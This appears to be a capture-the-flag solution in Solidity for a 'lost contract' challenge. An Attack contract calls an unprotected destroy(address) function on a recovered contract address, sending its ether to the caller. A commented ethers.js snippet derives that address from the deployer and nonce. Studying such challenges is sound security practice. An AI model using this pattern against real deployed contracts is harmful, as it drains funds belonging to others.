//SPDX-License-Identifier:MIT
pragma solidity ^0.6.0;

contract Attack{
    address addr=0x2722f225285A6ad30D4C8cB0653c9368818bC782;
    function attack()external{
        (bool success ,)=addr.call(abi.encodeWithSignature("destroy(address)",msg.sender));
        require(success,"attack failed");
    }
}



//ethers.js is used to find the lost contract address

// const { ethers } = require("hardhat");

// describe("create address",function(){
//     const addr = "0xEC404653bfFA652c55D88DFaE2339fB39b5395bd";
//     const nonce = "0x01";
//     const rlpEncoded = ethers.utils.RLP.encode([addr, nonce]);
//     const contractAddress = ethers.utils.keccak256(rlpEncoded);
//     console.log("created contract adddress :",`0x${contractAddress.slice(26)}`);
// });


//recovery Contract Address : 0x2722f225285a6ad30d4c8cb0653c9368818bc782
//checksum address :          0x2722f225285A6ad30D4C8cB0653c9368818bC782